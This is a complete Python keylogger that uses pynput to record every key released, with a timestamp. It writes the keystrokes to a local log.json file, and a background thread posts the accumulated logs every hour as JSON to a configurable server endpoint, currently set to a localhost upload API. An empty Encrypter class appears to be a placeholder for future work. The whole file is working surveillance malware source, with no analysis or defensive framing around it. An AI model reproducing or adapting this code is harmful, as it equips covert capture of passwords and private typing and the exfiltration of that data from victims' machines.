import time
import requests
import threading
import json
from pynput import keyboard
from pynput.keyboard import Key

class KeyLoggerService:
    def __init__(self):
        self.key_log_dict = {}
        self.all_logs = []

    def add_key(self, key):
        now_time = time.strftime("%d/%m/%y %H:%M", time.localtime())
        if now_time in self.key_log_dict:
            self.key_log_dict[now_time].append(str(key))
        else:
            self.key_log_dict[now_time] = [str(key)]

    def save_and_clear(self):
        if self.key_log_dict:
            self.all_logs.append(self.key_log_dict)
            self.key_log_dict = {}
        return self.all_logs

    def get_logs(self):
        return self.all_logs

    def clear_logs(self):
        self.all_logs = []

class FileWriter:
    @staticmethod
    def write_to_file(logs, machine_name="windows"):
        new_task = {
            "machine": machine_name,
            "data": logs
        }
        with open("log.json", "a", encoding="utf-8") as log_file:
            json.dump(new_task, log_file, indent=2, ensure_ascii=False)
            log_file.write("\n")

class ServerSender:
    def __init__(self, server_url, service, machine_name="Mac"):
        self.server_url = server_url
        self.service = service
        self.machine_name = machine_name
        threading.Thread(target=self.send_to_server, daemon=True).start()

    def send_to_server(self):
        while True:
            logs = self.service.get_logs()
            if logs:
                new_task = {
                    "machine": self.machine_name,
                    "data": logs
                }
                try:
                    response = requests.post(self.server_url, json=new_task)
                    print(f"Data sent to server. Response: {response.text}")
                    self.service.clear_logs()
                except requests.exceptions.RequestException as e:
                    print(f"Error sending data: {e}")
            time.sleep(3600)

class KeyLoggerManager:
    def __init__(self):
        self.service = KeyLoggerService()
        self.file_writer = FileWriter()
        self.server_sender = ServerSender("http://127.0.0.1:5001/api/upload", self.service)
        self.listener = None

    def handle_key_press(self, key):
        self.service.add_key(key)
        if key == Key.space:
            logs = self.service.save_and_clear()
            self.file_writer.write_to_file(logs)
        

    def start(self):
        with keyboard.Listener(on_release=self.handle_key_press) as listener:
            self.listener = listener
            listener.join()

class Encrypter:
    pass

if __name__ == "__main__":
    manager = KeyLoggerManager()
    manager.start()
